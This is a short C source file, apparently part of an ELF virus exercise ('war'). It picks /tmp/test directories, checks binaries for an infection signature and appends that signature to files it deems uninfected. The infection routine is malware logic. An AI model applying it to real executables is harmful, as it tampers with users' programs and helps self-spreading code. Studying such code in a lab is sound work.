#define _GNU_SOURCE

#include "../incl/war.h"

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    return ("/tmp/test2");
}

int     ft_is_infection(t_war *war)
{
    ft_obfuscation(war);
    war->signd = memmem(war->elf, war->file_size, war->decrypted, strlen(war->decrypted));
    if (war->signd)
        return (1);
    return (0);
}

void    ft_infect(t_war *war)
{
    munmap(war->elf, war->file_size);
    close(war->fd);
    war->fd = open(war->binary, O_WRONLY | O_NOFOLLOW);
    lseek(war->fd, 0, SEEK_END);
    write(war->fd, war->decrypted, strlen(war->decrypted));
    close(war->fd);
    return;
}